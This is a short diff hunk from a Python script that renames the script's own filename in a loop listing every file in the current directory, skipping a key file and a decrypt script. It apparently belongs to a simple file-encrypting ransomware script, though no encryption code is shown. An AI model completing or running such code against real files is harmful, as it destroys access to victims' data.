@@ -10,7 +10,7 @@ install('cryptography')
 files = []
 
 for file in os.listdir():
-    if file == "voldemort.py" or file == "key.key" or file == "decrypt.py":
+    if file == "darthvader.py" or file == "key.key" or file == "decrypt.py":
         continue
     if os.path.isfile(file):
         files.append(file)
